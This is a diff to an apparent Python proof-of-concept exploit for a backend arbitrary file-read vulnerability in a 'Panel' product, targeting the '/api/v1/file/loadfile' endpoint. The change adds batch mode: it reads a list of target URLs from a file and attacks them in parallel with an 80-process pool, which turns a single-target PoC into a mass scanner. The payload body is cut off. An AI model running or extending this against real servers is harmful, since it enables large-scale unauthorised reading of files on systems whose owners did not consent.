@@ -19,11 +19,23 @@ def banner():
 #主函数
 def main():
     banner()
-    parse = argparse.ArgumentParser(description="Panel loadfile 后台文件读取漏洞")
-    parse.add_argument('-url','--url',dest='url',help='input your url')
-    args = parse.parse_args()
-    if args.url:
-        poc()
+    parser = argparse.ArgumentParser(description="Panel loadfile 后台文件读取漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list =[]
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip())
+        pool = Pool(80)
+        pool.map(poc,url_list)
+        pool.close()
+        pool.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
 #poc函数
 def poc(target):
     payload ='/api/v1/file/loadfile ' 
